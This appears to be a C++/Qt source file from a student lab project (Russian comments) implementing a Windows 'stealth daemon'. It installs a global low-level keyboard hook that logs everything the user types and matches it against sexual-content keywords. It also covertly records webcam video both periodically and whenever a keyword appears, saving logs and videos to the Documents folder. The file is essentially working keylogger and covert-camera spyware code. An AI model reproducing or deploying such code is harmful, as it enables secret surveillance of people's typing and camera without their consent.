#include "stealthdaemon.h"
#include "cameraworker.h"
#include "lab4_logger.h"
#include <QDebug>
#include <QDir>
#include <QStandardPaths>
#include <QCoreApplication>

// Статические переменные
StealthDaemon* StealthDaemon::s_instance = nullptr;
QMutex StealthDaemon::s_instanceMutex;

StealthDaemon::StealthDaemon(QObject *parent)
    : QObject(parent),
      m_isRunning(false),
      m_loggingEnabled(true),
      m_photoInterval(5), // 5 секунд между видео
      m_videoDuration(4), // 4 секунды записи видео
      m_isRecordingVideo(false),
      m_keyboardHook(nullptr),
      m_bufferTimer(nullptr),
      m_logFile(nullptr),
      m_logStream(nullptr),
      m_cameraWorker(nullptr),
      m_videoTimer(nullptr)
{
    // Устанавливаем себя как единственный экземпляр
    QMutexLocker locker(&s_instanceMutex);
    s_instance = this;
    
    // Создаем таймер для обработки буфера клавиш
    m_bufferTimer = new QTimer(this);
    m_bufferTimer->setSingleShot(true);
    m_bufferTimer->setInterval(1000); // Обрабатываем буфер каждую секунду
    connect(m_bufferTimer, &QTimer::timeout, this, &StealthDaemon::processKeyBuffer);
    
    // Создаем таймер для периодических видео
    m_videoTimer = new QTimer(this);
    m_videoTimer->setSingleShot(false);
    connect(m_videoTimer, &QTimer::timeout, this, &StealthDaemon::startStealthVideo);
    
    // Создаем CameraWorker для захвата видео
    m_cameraWorker = new CameraWorker(this);
    
    // Подключаем сигналы камеры
    connect(m_cameraWorker, &CameraWorker::photoSaved, this, &StealthDaemon::photoTaken);
    // connect(m_cameraWorker, &CameraWorker::videoSaved, this, &StealthDaemon::videoRecorded); // Нет такого сигнала
    connect(m_cameraWorker, &CameraWorker::errorOccurred, this, &StealthDaemon::errorOccurred);
    
    // Устанавливаем ключевые слова по умолчанию
    m_keywords << "сэкс" << "порно" << "секс" << "porn" << "sex" << "xxx" << "nude" << "naked";
    
    qDebug() << "StealthDaemon created";
}

StealthDaemon::~StealthDaemon()
{
    stopDaemon();
    
    // Очищаем статический указатель
    QMutexLocker locker(&s_instanceMutex);
    if (s_instance == this) {
        s_instance = nullptr;
    }
    
    cleanupKeylogger();
    
    if (m_logStream) {
        delete m_logStream;
        m_logStream = nullptr;
    }
    
    if (m_logFile) {
        m_logFile->close();
        delete m_logFile;
        m_logFile = nullptr;
    }
    
    qDebug() << "StealthDaemon destroyed";
}

void StealthDaemon::startDaemon()
{
    Lab4Logger::instance()->logStealthDaemonEvent("startDaemon() called");
    
    if (m_isRunning) {
        Lab4Logger::instance()->logWarning(Lab4Logger::STEALTH_DAEMON, "Attempted to start already running daemon");
        qDebug() << "Daemon already running";
        return;
    }
    
    Lab4Logger::instance()->logStealthDaemonEvent("Starting stealth daemon...");
    qDebug() << "Starting stealth daemon...";
    
    // Инициализируем keylogger
    Lab4Logger::instance()->logStealthDaemonEvent("Attempting to initialize keylogger...");
    if (!initializeKeylogger()) {
        Lab4Logger::instance()->logError(Lab4Logger::STEALTH_DAEMON, "Failed to initialize keylogger");
        emit errorOccurred("Не удалось инициализировать keylogger");
        return;
    }
    Lab4Logger::instance()->logStealthDaemonEvent("Keylogger initialized successfully");
    
    // Открываем лог файл
    if (m_loggingEnabled) {
        QString logPath = getLogFilePath();
        m_logFile = new QFile(logPath);
        if (m_logFile->open(QIODevice::WriteOnly | QIODevice::Append)) {
            m_logStream = new QTextStream(m_logFile);
            *m_logStream << "\n=== STEALTH DAEMON STARTED ===" << endl;
            *m_logStream << "Time: " << QDateTime::currentDateTime().toString() << endl;
            *m_logStream << "Keywords: " << m_keywords.join(", ") << endl;
            m_logStream->flush();
        }
    }
    
    m_isRunning = true;
    
    // Запускаем периодические видео (каждые 5 секунд)
    m_videoTimer->start(m_photoInterval * 1000);
    
    logToFile("Stealth daemon started successfully");
    emit daemonStarted();
    
    qDebug() << "Stealth daemon started successfully";
}

void StealthDaemon::stopDaemon()
{
    if (!m_isRunning) {
        return;
    }
    
    qDebug() << "Stopping stealth daemon...";
    
    m_isRunning = false;
    
    // Останавливаем таймеры
    m_videoTimer->stop();
    m_bufferTimer->stop();
    
    // Останавливаем видео если записывается
    if (m_isRecordingVideo) {
        stopStealthVideo();
    }
    
    // Очищаем keylogger
    Lab4Logger::instance()->logStealthDaemonEvent("Stopping stealth daemon, cleaning up keylogger...");
    cleanupKeylogger();
    
    // Закрываем лог файл
    if (m_logStream) {
        *m_logStream << "=== STEALTH DAEMON STOPPED ===" << endl;
        *m_logStream << "Time: " << QDateTime::currentDateTime().toString() << endl;
        m_logStream->flush();
        delete m_logStream;
        m_logStream = nullptr;
    }
    
    if (m_logFile) {
        m_logFile->close();
        delete m_logFile;
        m_logFile = nullptr;
    }
    
    logToFile("Stealth daemon stopped");
    emit daemonStopped();
    
    qDebug() << "Stealth daemon stopped";
}

void StealthDaemon::setKeywords(const QStringList &keywords)
{
    m_keywords = keywords;
    logToFile(QString("Keywords updated: %1").arg(keywords.join(", ")));
}

void StealthDaemon::setPhotoInterval(int seconds)
{
    m_photoInterval = seconds;
    if (m_videoTimer->isActive()) {
        m_videoTimer->start(seconds * 1000);
    }
    logToFile(QString("Video interval set to %1 seconds").arg(seconds));
}

void StealthDaemon::setVideoDuration(int seconds)
{
    m_videoDuration = seconds;
    logToFile(QString("Video duration set to %1 seconds").arg(seconds));
}

void StealthDaemon::setLoggingEnabled(bool enabled)
{
    m_loggingEnabled = enabled;
    logToFile(QString("Logging %1").arg(enabled ? "enabled" : "disabled"));
}

bool StealthDaemon::initializeKeylogger()
{
    Lab4Logger::instance()->logStealthDaemonEvent("Starting keylogger initialization...");
    
    // Проверка прав доступа - ПРЕДУПРЕЖДАЕМ, но НЕ ОСТАНАВЛИВАЕМ
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            if (elevation.TokenIsElevated) {
                Lab4Logger::instance()->logStealthDaemonEvent("Running with administrator privileges");
            } else {
                Lab4Logger::instance()->logWarning(Lab4Logger::STEALTH_DAEMON, "Running without administrator privileges - keylogger may not work");
                emit errorOccurred("⚠️ Демон запущен без прав администратора. Keylogger может не работать. Для полной функциональности перезапустите от имени администратора.");
            }
        }
        CloseHandle(hToken);
    } else {
        Lab4Logger::instance()->logWarning(Lab4Logger::STEALTH_DAEMON, "Failed to check administrator privileges - continuing anyway");
    }
    
    // Получаем handle модуля
    HMODULE hModule = GetModuleHandle(nullptr);
    if (hModule == nullptr) {
        DWORD error = GetLastError();
        Lab4Logger::instance()->logError(Lab4Logger::STEALTH_DAEMON, QString("Failed to get module handle, error: %1").arg(error));
        qDebug() << "Failed to get module handle, error:" << error;
        return false;
    }
    
    Lab4Logger::instance()->logStealthDaemonEvent(QString("Module handle obtained: 0x%1").arg((quintptr)hModule, 0, 16));
    
    // Устанавливаем низкоуровневый хук клавиатуры
    Lab4Logger::instance()->logStealthDaemonEvent("Installing keyboard hook...");
    m_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hModule, 0);
    
    if (m_keyboardHook == nullptr) {
        DWORD error = GetLastError();
        Lab4Logger::instance()->logWarning(Lab4Logger::STEALTH_DAEMON, QString("Failed to install keyboard hook, error: %1").arg(error));
        qDebug() << "Failed to install keyboard hook, error:" << error;
        
        // Детальная диагностика ошибки
        QString errorMessage;
        switch (error) {
            case ERROR_ACCESS_DENIED:
                errorMessage = "Access denied - try running as administrator";
                break;
            case ERROR_INVALID_HOOK_FILTER:
                errorMessage = "Invalid hook filter";
                break;
            case ERROR_INVALID_PARAMETER:
                errorMessage = "Invalid parameter";
                break;
            case ERROR_MOD_NOT_FOUND:
                errorMessage = "Module not found";
                break;
            default:
                errorMessage = QString("Unknown error: %1").arg(error);
                break;
        }
        
        Lab4Logger::instance()->logWarning(Lab4Logger::STEALTH_DAEMON, errorMessage);
        emit errorOccurred(QString("⚠️ Keylogger не удалось инициализировать: %1. Демон будет работать без отслеживания клавиш.").arg(errorMessage));
        
        // НЕ возвращаем false - продолжаем работу без keylogger
        Lab4Logger::instance()->logStealthDaemonEvent("Continuing daemon operation without keylogger");
        return true; // Продолжаем работу
    }
    
    Lab4Logger::instance()->logStealthDaemonEvent(QString("Keyboard hook installed successfully, handle: 0x%1").arg((quintptr)m_keyboardHook, 0, 16));
    qDebug() << "Keyboard hook installed successfully";
    
    // Тестируем hook
    Lab4Logger::instance()->logStealthDaemonEvent("Testing keyboard hook...");
    
    // Запускаем message loop для обработки hook сообщений
    Lab4Logger::instance()->logStealthDaemonEvent("Starting message loop for keyboard hook...");
    
    return true;
}

void StealthDaemon::cleanupKeylogger()
{
    Lab4Logger::instance()->logStealthDaemonEvent("Cleaning up keylogger...");
    
    if (m_keyboardHook != nullptr) {
        Lab4Logger::instance()->logStealthDaemonEvent(QString("Removing keyboard hook: 0x%1").arg((quintptr)m_keyboardHook, 0, 16));
        
        BOOL result = UnhookWindowsHookEx(m_keyboardHook);
        if (result) {
            Lab4Logger::instance()->logStealthDaemonEvent("Keyboard hook removed successfully");
            qDebug() << "Keyboard hook removed";
        } else {
            DWORD error = GetLastError();
            Lab4Logger::instance()->logError(Lab4Logger::STEALTH_DAEMON, QString("Failed to remove keyboard hook, error: %1").arg(error));
            qDebug() << "Failed to remove keyboard hook, error:" << error;
        }
        
        m_keyboardHook = nullptr;
    } else {
        Lab4Logger::instance()->logStealthDaemonEvent("No keyboard hook to remove");
    }
}

LRESULT CALLBACK StealthDaemon::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    // Логируем первые несколько вызовов для диагностики
    static int hookCallCount = 0;
    if (hookCallCount < 5) {
        Lab4Logger::instance()->logDebug(Lab4Logger::STEALTH_DAEMON, QString("LowLevelKeyboardProc called: nCode=%1, wParam=%2").arg(nCode).arg(wParam));
        hookCallCount++;
    }
    
    if (nCode >= 0) {
        QMutexLocker locker(&s_instanceMutex);
        if (s_instance && s_instance->m_isRunning) {
            KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
            
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
                s_instance->processKeyPress(pKeyboard->vkCode, true);
            }
        } else {
            // Логируем если демон не запущен
            static int notRunningCount = 0;
            if (notRunningCount < 3) {
                Lab4Logger::instance()->logDebug(Lab4Logger::STEALTH_DAEMON, "Hook called but daemon not running");
                notRunningCount++;
            }
        }
    }
    
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

void StealthDaemon::processKeyPress(DWORD vkCode, bool isKeyDown)
{
    if (!isKeyDown) {
        return;
    }
    
    // Логируем каждое нажатие клавиши (только первые несколько для диагностики)
    static int keyPressCount = 0;
    if (keyPressCount < 10) {
        Lab4Logger::instance()->logDebug(Lab4Logger::STEALTH_DAEMON, QString("Key pressed: VK_CODE=%1").arg(vkCode));
        keyPressCount++;
    }
    
    QMutexLocker locker(&m_bufferMutex);
    
    // Преобразуем виртуальный код клавиши в символ
    char key = 0;
    
    // Обрабатываем основные клавиши
    if (vkCode >= 'A' && vkCode <= 'Z') {
        // Проверяем состояние Shift
        bool isShiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
        key = isShiftPressed ? (char)vkCode : (char)(vkCode + 32); // A->a
    } else if (vkCode >= '0' && vkCode <= '9') {
        key = (char)vkCode;
    } else if (vkCode == VK_SPACE) {
        key = ' ';
    } else if (vkCode == VK_RETURN) {
        key = '\n';
    } else if (vkCode == VK_BACK) {
        if (!m_keyBuffer.isEmpty()) {
            m_keyBuffer.chop(1);
        }
        return;
    } else {
        // Пропускаем служебные клавиши
        return;
    }
    
    // Добавляем символ в буфер
    m_keyBuffer += key;
    
    // Ограничиваем размер буфера
    if (m_keyBuffer.length() > 1000) {
        m_keyBuffer = m_keyBuffer.right(500);
    }
    
    // Запускаем таймер обработки буфера
    if (!m_bufferTimer->isActive()) {
        m_bufferTimer->start();
    }
}

void StealthDaemon::processKeyBuffer()
{
    QMutexLocker locker(&m_bufferMutex);
    
    if (m_keyBuffer.isEmpty()) {
        return;
    }
    
    QString text = m_keyBuffer;
    m_keyBuffer.clear();
    
    // Логируем текущий текст для диагностики (только первые несколько раз)
    static int textCheckCount = 0;
    if (textCheckCount < 5) {
        Lab4Logger::instance()->logDebug(Lab4Logger::STEALTH_DAEMON, QString("Checking text for keywords: '%1'").arg(text));
        textCheckCount++;
    }
    
    // Проверяем на ключевые слова
    if (containsKeyword(text)) {
        QString detectedKeyword;
        for (const QString &keyword : m_keywords) {
            if (text.contains(keyword, Qt::CaseInsensitive)) {
                detectedKeyword = keyword;
                break;
            }
        }
        
        Lab4Logger::instance()->logStealthDaemonEvent(QString("KEYWORD DETECTED: '%1' in text: '%2'").arg(detectedKeyword).arg(text));
        logToFile(QString("KEYWORD DETECTED: '%1' in text: '%2'").arg(detectedKeyword).arg(text));
        emit keywordDetected(detectedKeyword);
        
        // Запускаем видео при обнаружении ключевого слова
        Lab4Logger::instance()->logStealthDaemonEvent("Initiating stealth video recording due to keyword detection");
        startStealthVideo();
    }
}

bool StealthDaemon::containsKeyword(const QString &text)
{
    for (const QString &keyword : m_keywords) {
        if (text.contains(keyword, Qt::CaseInsensitive)) {
            return true;
        }
    }
    return false;
}

void StealthDaemon::takeStealthPhoto()
{
    if (!m_isRunning) {
        return;
    }
    
    logToFile("Starting periodic stealth video recording");
    startStealthVideo();
}

void StealthDaemon::captureStealthPhoto()
{
    Lab4Logger::instance()->logStealthDaemonEvent("captureStealthPhoto() called");
    
    if (!m_cameraWorker) {
        Lab4Logger::instance()->logError(Lab4Logger::STEALTH_DAEMON, "CameraWorker is null");
        logToFile("ERROR: CameraWorker is null");
        return;
    }
    
    if (!m_cameraWorker->isInitialized()) {
        Lab4Logger::instance()->logError(Lab4Logger::STEALTH_DAEMON, "Camera not initialized");
        logToFile("ERROR: Camera not available for stealth photo");
        return;
    }
    
    Lab4Logger::instance()->logStealthDaemonEvent("Camera is available, taking stealth photo");
    
    // Делаем фото через CameraWorker
    m_cameraWorker->takePhoto();
    
    Lab4Logger::instance()->logStealthDaemonEvent("Stealth photo capture initiated");
    logToFile("Stealth photo capture initiated");
}

void StealthDaemon::startStealthVideo()
{
    Lab4Logger::instance()->logStealthDaemonEvent("startStealthVideo() called");
    
    if (!m_cameraWorker) {
        Lab4Logger::instance()->logError(Lab4Logger::STEALTH_DAEMON, "CameraWorker is null");
        logToFile("ERROR: CameraWorker is null");
        return;
    }
    
    if (m_isRecordingVideo) {
        Lab4Logger::instance()->logWarning(Lab4Logger::STEALTH_DAEMON, "Video recording already in progress");
        return;
    }
    
    // Проверяем доступность камеры
    if (!m_cameraWorker->isInitialized()) {
        Lab4Logger::instance()->logWarning(Lab4Logger::STEALTH_DAEMON, "Camera not available - trying to initialize");
        logToFile("WARNING: Camera not available, attempting initialization");
        
        // Пытаемся инициализировать камеру с несколькими попытками
        const int maxAttempts = 3;
        bool initOk = false;
        for (int attempt = 1; attempt <= maxAttempts; ++attempt) {
            if (m_cameraWorker->initializeCamera()) {
                initOk = true;
                break;
            }
            Lab4Logger::instance()->logWarning(Lab4Logger::STEALTH_DAEMON, QString("Camera init attempt %1 failed, retrying...").arg(attempt));
            QThread::msleep(500);
        }
        if (!initOk) {
            Lab4Logger::instance()->logError(Lab4Logger::STEALTH_DAEMON, "Failed to initialize camera for stealth video after retries");
            logToFile("ERROR: Failed to initialize camera for stealth video after retries");
            emit errorOccurred("⚠️ Камера недоступна для скрытого видео. Возможно, она занята другим приложением.");
            return;
        }
    }
    
    Lab4Logger::instance()->logStealthDaemonEvent("Starting stealth video recording");
    logToFile("Starting stealth video recording");
    
    // Запускаем запись видео
    m_cameraWorker->startVideoRecording();
    m_isRecordingVideo = true;
    
    // Автоматически останавливаем через m_videoDuration секунд
    QTimer::singleShot(m_videoDuration * 1000, this, &StealthDaemon::stopStealthVideo);
    
    Lab4Logger::instance()->logStealthDaemonEvent("Stealth video recording started");
    logToFile("Stealth video recording started");

    // Добавляем видео в индекс, чтобы было видно, какие файлы создаются фоном
    QString idxDir = QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation) + "/Lab4_StealthLogs";
    QDir().mkpath(idxDir);
    QFile idxFile(idxDir + "/videos_index.txt");
    if (idxFile.open(QIODevice::WriteOnly | QIODevice::Append | QIODevice::Text)) {
        QTextStream out(&idxFile);
        out << QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss")
            << " | started | " << m_cameraWorker->getCurrentVideoPath() << "\n";
        idxFile.close();
    }
}

void StealthDaemon::stopStealthVideo()
{
    Lab4Logger::instance()->logStealthDaemonEvent("stopStealthVideo() called");
    
    if (!m_isRecordingVideo) {
        Lab4Logger::instance()->logWarning(Lab4Logger::STEALTH_DAEMON, "No video recording in progress");
        return;
    }
    
    Lab4Logger::instance()->logStealthDaemonEvent("Stopping stealth video recording");
    logToFile("Stopping stealth video recording");
    
    // Останавливаем запись видео
    m_cameraWorker->stopVideoRecording();
    m_isRecordingVideo = false;
    
    // Эмитируем сигнал о завершении записи видео: используем фактический путь из CameraWorker
    QString videoPath = m_cameraWorker ? m_cameraWorker->getCurrentVideoPath() : QString();
    if (videoPath.isEmpty()) {
        videoPath = getStealthVideoPath();
    }
    emit videoRecorded(videoPath);

    // Отмечаем завершение в индексе
    QString idxDir = QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation) + "/Lab4_StealthLogs";
    QDir().mkpath(idxDir);
    QFile idxFile(idxDir + "/videos_index.txt");
    if (idxFile.open(QIODevice::WriteOnly | QIODevice::Append | QIODevice::Text)) {
        QTextStream out(&idxFile);
        out << QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss")
            << " | stopped | " << videoPath << "\n";
        idxFile.close();
    }
    
    Lab4Logger::instance()->logStealthDaemonEvent("Stealth video recording stopped");
    logToFile("Stealth video recording stopped");
}

QString StealthDaemon::getStealthVideoPath()
{
    QString outputDir = QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation) + "/Lab4_StealthVideos";
    QDir().mkpath(outputDir);
    
    QString timestamp = QDateTime::currentDateTime().toString("yyyyMMdd_HHmmss_zzz");
    return outputDir + "/stealth_video_" + timestamp + ".avi";
}

void StealthDaemon::logToFile(const QString &message)
{
    if (!m_loggingEnabled || !m_logStream) {
        return;
    }
    
    QMutexLocker locker(&m_logMutex);
    
    QString timestamp = QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss.zzz");
    *m_logStream << QString("[%1] %2").arg(timestamp).arg(message) << endl;
    m_logStream->flush();
    
    // Также отправляем в сигнал для отображения в UI
    emit logMessage(QString("[%1] %2").arg(timestamp).arg(message));
}

QString StealthDaemon::getLogFilePath()
{
    QString documentsPath = QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation);
    QString logDir = documentsPath + "/Lab4_StealthLogs";
    
    QDir dir;
    if (!dir.exists(logDir)) {
        dir.mkpath(logDir);
    }
    
    QString timestamp = QDateTime::currentDateTime().toString("yyyyMMdd");
    return logDir + "/stealth_daemon_" + timestamp + ".log";
}

QString StealthDaemon::getStealthPhotoPath()
{
    QString documentsPath = QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation);
    QString photoDir = documentsPath + "/Lab4_StealthPhotos";
    
    QDir dir;
    if (!dir.exists(photoDir)) {
        dir.mkpath(photoDir);
    }
    
    return photoDir;
}

// Реализация StealthDaemonThread
StealthDaemonThread::StealthDaemonThread(QObject *parent)
    : QThread(parent),
      m_daemon(nullptr)
{
}

StealthDaemonThread::~StealthDaemonThread()
{
    if (m_daemon) {
        m_daemon->stopDaemon();
        delete m_daemon;
        m_daemon = nullptr;
    }
}

void StealthDaemonThread::run()
{
    qDebug() << "StealthDaemonThread started";
    Lab4Logger::instance()->logStealthDaemonEvent("StealthDaemonThread::run() started");
    
    // Создаем демон внутри потока, чтобы его объекты принадлежали этому потоку
    m_daemon = new StealthDaemon();
    if (m_daemon) {
        // Применяем конфигурацию, установленную перед запуском потока
        if (!m_keywords.isEmpty()) {
            m_daemon->setKeywords(m_keywords);
        }
        m_daemon->setPhotoInterval(m_photoInterval);
        m_daemon->setVideoDuration(m_videoDuration);
        m_daemon->setLoggingEnabled(m_loggingEnabled);

        Lab4Logger::instance()->logStealthDaemonEvent("Starting daemon in thread...");
        m_daemon->startDaemon();
        Lab4Logger::instance()->logStealthDaemonEvent("Daemon started successfully");
    } else {
        Lab4Logger::instance()->logError(Lab4Logger::STEALTH_DAEMON, "Failed to instantiate StealthDaemon in thread");
    }
    
    // Ждем завершения потока
    Lab4Logger::instance()->logStealthDaemonEvent("StealthDaemonThread waiting for completion...");
    
    // Используем Qt event loop для обработки событий
    exec(); // Это блокирует поток до вызова quit()
    
    Lab4Logger::instance()->logStealthDaemonEvent("StealthDaemonThread finished");
    qDebug() << "StealthDaemonThread finished";
}
